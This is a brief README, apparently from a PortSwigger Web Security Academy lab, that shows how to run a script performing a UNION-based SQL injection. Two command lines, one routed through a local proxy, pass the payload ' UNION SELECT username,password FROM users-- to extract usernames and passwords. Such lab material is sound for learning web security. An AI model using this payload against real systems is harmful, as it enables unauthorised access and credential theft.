# How to run script.py

### SQL injection UNION attack, retrieving data from other tables

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' UNION SELECT username,password FROM users--"`

Proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "' UNION SELECT username,password FROM users--" -p 127.0.0.1:8080`
